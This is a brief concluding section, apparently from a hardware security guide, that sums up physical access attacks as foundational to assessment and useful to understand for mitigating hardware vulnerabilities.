## Conclusion

Physical access attacks are foundational to hardware security assessment. While they require direct access to the target device, they often provide the deepest level of system access and can bypass software protections entirely. Understanding these attack vectors helps security professionals identify and mitigate hardware vulnerabilities effectively.
